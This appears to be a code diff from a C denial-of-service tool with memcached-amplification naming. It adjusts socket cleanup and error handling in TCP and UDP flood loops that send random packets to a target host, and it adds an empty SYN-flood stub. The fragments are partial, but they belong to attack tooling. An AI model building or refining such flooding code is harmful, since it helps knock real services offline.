@@ -11,6 +11,7 @@
 #include "memcrashed.h"
 
 #include <math.h>//pow
+#include <stdio.h>//close
 
 #ifndef DOUBLE_MAX
 #define DOUBLE_MAX 0.0
@@ -85,12 +86,12 @@ void _ddos_tcp(char* host, int port, char* packet)
         }
         if (!__run) {
             shutdown(sock, 2);
-            free(buf);
-            free(packet);
-            free(host);
+            close(sock);
             break;
         }
-        assert(sock >= 0);
+        if(sock<0){
+            dperror("Failed to open socket");
+        }
         if (RAND_PACKET) {
             packet = randstring(randrange(64, 2048));
         }
@@ -104,6 +105,8 @@ void _ddos_tcp(char* host, int port, char* packet)
                 fflush(stdout);
                 warning("Socket disconnected.");
                 info("Attempting to reconnect tcp sock");
+                shutdown(sock, 2);
+                close(sock);
                 sock = dos_tcp_sock(host, port);
                 pthread_mutex_unlock(&mutex);
             }
@@ -129,9 +132,6 @@ void _ddos_udp(char* host, int port, char* packet)
         }
         if (!__run) {
             shutdown(sock, 2);
-            free(buf);
-            free(packet);
-            free(host);
             break;
         }
         if (RAND_PACKET) {
@@ -147,6 +147,9 @@ void _ddos_udp(char* host, int port, char* packet)
         }
     }
     tcount--;
+}
+void ddos_synflood(_dos_param* x){
+    //TODO
 }
 
 void _ddos_stat()//update stat
@@ -187,10 +190,6 @@ void __ddos_wrapper(_dos_param* x)
         error("Bad wrapper descriptor!");
         assert(false);
     }
-}
-
-void _ddos_memcrashed(_dos_param* x){
-    
 }
 void ddos(char* host, int port, char* packet, int _tcount, int mode)
 {
